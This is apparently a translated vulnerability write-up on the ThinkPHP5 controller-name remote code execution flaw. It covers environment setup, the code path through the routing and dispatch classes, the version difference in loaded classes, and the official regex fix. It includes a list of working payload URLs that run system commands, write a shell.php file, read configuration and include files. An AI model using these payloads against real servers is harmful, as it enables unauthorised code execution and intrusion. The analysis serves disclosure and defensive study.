# ThinkPHP5 Remote Code Execution 1

Author: H3rmesk1t

Data: 2021.08.16

# Vulnerability Summary
- This vulnerability exists in ThinkPHP. The underlying layer does not perform good legality verification on the controller name, resulting in the user being able to call any method of any class without turning on the forced routing, which ultimately leads to the occurrence of remote code execution vulnerability.
- Vulnerability impact version:
5.0.7<=ThinkPHP5<=5.0.22, 5.1.0<=ThinkPHP<=5.1.30

# Initial configuration

Get the test environment code

```bash
composer create-project --prefer-dist topthink/think tpdemo
```
![Insert the picture description here](https://img-blog.csdnimg.cn/136afc6c7ce54d68a8fd6f71227d7359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Set the require field of the composer.json file to the following

```bash
"require": {
    "php": ">=5.6.0",
    "topthink/framework": "5.1.30"
},
```

Then execute `composer update`

![Insert the picture description here](https://img-blog.csdnimg.cn/83651621b82d4bf79a0aca3f728407e8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

# Vulnerability Exploit

Payload

```bash
5.1.x
?s=index/\think\Request/input&filter[]=system&data=pwd
?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>
?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
5.0.x
?s=index/think\config/get&name=database.username # Get configuration information
?s=index/\think\Lang/load&file=../../test.jpg # Contains any file
?s=index/\think\Config/load&file=../../t.php # Contains any .php file
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```
![Insert the picture description here](https://img-blog.csdnimg.cn/742c864af6c245ddbca83f60bcc3be17.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Vulnerability Analysis

The ThinkPHP installed by default does not enable the forced routing option, and the routing compatibility mode is enabled by default.

![Insert the picture description here](https://img-blog.csdnimg.cn/c8e2ccf134b84d579acbb443fe66d3f1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

The command routing instructions can be used to use the routing compatibility mode `s` parameter, and the framework does not detect the controller name sufficiently, indicating that any controller may be called. Then you can try to use the `http://site/?s=module/controller/method` to test it; in the previous ThinkPHP SQL injection analysis article, it was mentioned that all user parameters will be processed by the `input` method of the `Request` class, which will call the `filterValue` method, and the `filterValue` method uses `call_user_func`, so try to use this method

````bas
http://127.0.0.1/cms/public/?s=index/\think\Request/input&filter[]=phpinfo&data=1
```


Looking up its commit record and found that it has added detection of controller name

![Insert the picture description here](https://img-blog.csdnimg.cn/9818dcb37da6490a99c00335fb6262fa.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Follow up with `thinkphp/library/think/route/dispatch/Module.php`, set a breakpoint in the `$controller` code segment, and you can see that the name of the controller is obtained from `$result`, and the value of `$result` comes from `pathinfo` in compatible mode, that is, `s` parameter

![Insert the picture description here](https://img-blog.csdnimg.cn/2dfd2a6e76cd4a5b90baf8d66ea5c601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/6cfdd755611140479434cf1d423e1864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Follow up on `thinkphp/library/think/App.php`, enter the `run` method of the `App` class, and then call the `run` method of the `Dispatch` class, follow up on `thinkphp/library/think/route/Dispatch.php`, and find that this method will call the key function `exec`

![Insert the picture description here](https://img-blog.csdnimg.cn/bbbc6a8b5aaf4847b0244b24c6014bbc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/c4b3c957dc0d4f85818f2a4bd06dadda.png#pic_center)

In the `exec` function, the program uses the reflection mechanism to call the class methods. The classes, methods and parameters here are all controllable, and the entire process does not see the program detect the legitimacy of the controller name, which is also the direct cause of the remote code execution vulnerability.

![Insert the image description here](https://img-blog.csdnimg.cn/c31aa0b6a17b423f8933b81a6c784
e56.png#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/02448a796128426382b2876a67633cf0.png#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/18449473a19249bdbc96f80834d43ac2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

The above is a vulnerability analysis for the ThinkPHP5.1.x version. If you use this version of payload to test the ThinkPHP5.0.x version, you will find that many payloads cannot succeed. The reason is that the two large versions have different loaded classes, resulting in the available classes being different.

```bash
ThinkPHP 5.1.x ThinkPHP 5.0.x
stdClass stdClass
Exception Exception
ErrorException ErrorException
Closure Closure
Generator Generator
DateTime DateTime
DateTimeImmutable DateTimeImmutable
DateTimeZone DateTimeZone
DateInterval DateInterval
DatePeriod
LibXMLError LibXMLError
DOMException DOMException
DOMStringList DOMStringList
DOMNameList DOMNameList
DOMImplementationList DOMImplementationList
DOMImplementationSource DOMImplementationSource
DOMImplementation DOMImplementation
DOMNode DOMNode
DOMNameSpaceNode DOMNameSpaceNode
DOMDocumentFragment DOMDocumentFragment
DOMDocument DOMDocument
DOMNodeList DOMNodeList
DOMNamedNodeMap DOMNamedNodeMap
DOMCharacterData DOMCharacterData
DOMAttr DOMAttr
DOMElement DOMElement
DOMText DOMText
DOMComment DOMComment
DOMTypeinfo DOMTypeinfo
DOMUserDataHandler DOMUserDataHandler
DOMDomError DOMDomError
DOMErrorHandler DOMErrorHandler
DOMLocator DOMLocator
DOMConfiguration DOMConfiguration
DOMCdataSection DOMCdataSection
DOMDocumentType DOMDocumentType
DOMNotation DOMNotation
DOMEntity DOMEntity
DOMEntityReference DOMEntityReference
DOMProcessingInstruction DOMProcessingInstruction
DOMStringExtend DOMStringExtend
DOMXPath DOMXPath
finfo finfo
LogicException LogicException
BadFunctionCallException BadFunctionCallException
BadMethodCallException BadMethodCallException
DomainException DomainException
InvalidArgumentException InvalidArgumentException
LengthException LengthException
OutOfRangeException OutOfRangeException
RuntimeException RuntimeException
OutOfBoundsException OutOfBoundsException
OverflowException OverflowException
RangeException RangeException
UnderflowException UnderflowException
UnexpectedValueException UnexpectedValueException
RecursiveIteratorIteratorRecursiveIteratorIterator
IteratorIteratorIteratorIterator
FilterIterator FilterIterator
RecursiveFilterIterator RecursiveFilterIterator
CallbackFilterIterator CallbackFilterIterator
RecursiveCallbackFilterIterator RecursiveCallbackFilterIterator
ParentIterator ParentIterator
LimitIterator LimitIterator
CachingIterator CachingIterator
RecursiveCachingIterator RecursiveCachingIterator
NoRewindIterator NoRewindIterator
AppendIterator AppendIterator
InfiniteIterator InfiniteIterator
RegexIterator RegexIterator
RecursiveRegexIterator RecursiveRegexIterator
EmptyIt
eptor EmptyIterator
RecursiveTreeIterator RecursiveTreeIterator
ArrayObject ArrayObject
ArrayIterator ArrayIterator
RecursiveArrayIterator RecursiveArrayIterator
SplFileInfo SplFileInfo
DirectoryIterator DirectoryIterator
FilesystemIterator FilesystemIterator
RecursiveDirectoryIterator RecursiveDirectoryIterator
GlobIterator GlobIterator
SplFileObject SplFileObject
SplTempFileObject SplTempFileObject
SplDoublyLinkedList SplDoublyLinkedList
SplQueue SplQueue
SplStack SplStack
SplHeap SplHeap
SplMinHeap SplMinHeap
SplMaxHeap SplMaxHeap
SplPriorityQueue SplPriorityQueue
SplFixedArray SplFixedArray
SplObjectStorage SplObjectStorage
MultipleIterator MultipleIterator
SessionHandler SessionHandler
ReflectionException ReflectionException
Reflection Reflection
ReflectionFunctionAbstract ReflectionFunctionAbstract
ReflectionFunction ReflectionFunction
ReflectionParameter ReflectionParameter
ReflectionMethod ReflectionMethod
ReflectionClass ReflectionClass
ReflectionObject ReflectionObject
ReflectionProperty ReflectionProperty
ReflectionExtension ReflectionExtension
ReflectionZendExtension ReflectionZendExtension
__PHP_Incomplete_Class __PHP_Incomplete_Class
php_user_filter php_user_filter
Directory Directory
SimpleXMLElement SimpleXMLElement
SimpleXMLIterator SimpleXMLIterator
SoapClient SoapClient
SoapVar SoapVar
SoapServer SoapServer
SoapFault SoapFault
SoapParam SoapParam
SoapHeader SoapHeader
PharException PharException
Phar Phar
PharData PharData
PharFileInfo PharFileInfo
XMLReader XMLReader
XMLWriter XMLWriter
ZipArchive ZipArchive
PDOException PDOException
PDO PDO
PDOStatement PDOStatement
PDORow PDORow
CURLFile CURLFile
Collator Collator
NumberFormatter NumberFormatter
Normalizer Normalizer
Locale Locale
MessageFormatter MessageFormatter
IntlDateFormatter IntlDateFormatter
ResourceBundle ResourceBundle
Transliterator Transliterator
IntlTimeZone IntlTimeZone
IntlCalendar IntlCalendar
IntlGregorianCalendar IntlGregorianCalendar
Spoofchecker Spoofchecker
IntlException IntlException
IntlIterator IntlIterator
IntlBreakIterator IntlBreakIterator
IntlRuleBasedBreakIterator IntlRuleBasedBreakIterator
IntlCodePointBreakIterator IntlCodePointBreakIterator
IntlPartsIterator IntlPartsIterator
UConverter UConverter
JsonIncrementalParser JsonIncrementalParser
mysqli_sql_exception mysqli_sql_exception
mysqli_driver mysqli_driver
mysqli mysqli
mysqli_warning mysqli_warning
mysqli_result mysqli_result
mysqli_stmt mysqli_stmt
Composer\Autoload\ComposerStaticInit81a
0c33d33d83a86fdd976e2aff753d9 Composer\Autoload\ComposerStaticInit8a67cf04fc9c0db5b85a9d897c12a44c
think\Loader think\Loader
think\Error think\Error
think\Container think\Config
think\App think\App
think\Env think\Request
think\Config think\Hook
think\Hook think\Env
think\Facade think\Lang
think\facade\Env think\Log
env think\Route
think\Db
think\Lang
think\Request
think\facade\Route
route
think\Route
think\route\Rule
think\route\RuleGroup
think\route\Domain
think\route\RuleItem
think\route\RuleName
think\route\Dispatch
think\route\dispatch\Url
think\route\dispatch\Module
think\Middleware
think\Cookie
think\View
think\view\driver\Think
think\Template
think\template\driver\File
think\Log
think\log\driver\File
think\Session
think\Debug
think\Cache
think\cache\Driver
think\cache\driver\File
```
# Vulnerability Fix

The official fix is: add the regular expression `^[A-Za-z](\w)*$` to detect the legality of the controller name

![Insert the picture description here](https://img-blog.csdnimg.cn/f5680124f7f849e9a4f8167e410bd059.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Attack summary

Refer to Master Mochazz's audit process

![Insert the picture description here](https://img-blog.csdnimg.cn/ea19941e4a6b460b8af000aaccc0f29d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)